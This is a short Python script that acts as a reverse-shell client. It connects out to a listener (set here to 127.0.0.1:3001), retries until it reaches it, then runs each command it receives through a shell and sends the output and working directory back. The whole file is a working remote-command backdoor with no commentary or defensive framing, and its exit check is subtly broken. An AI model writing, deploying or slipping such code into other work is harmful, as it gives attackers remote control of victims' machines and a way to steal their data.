import os
import socket
import subprocess
import time

s = socket.socket()
host = '127.0.0.1'
port = 3001

while True:
    try:
        s.connect((host, port))
        print("Connected")
        break
    except:
        print("Failed to connect!\nRetrying...")
        time.sleep(5)

while True:
    data = s.recv(1024)
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))
        s.send(str.encode(os.getcwd()))
    elif data == 'exit':
        break
    elif len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_bytes, "utf-8")
        s.send(str.encode(output_str + str(os.getcwd()) + '> '))
        print(output_bytes)

s.close()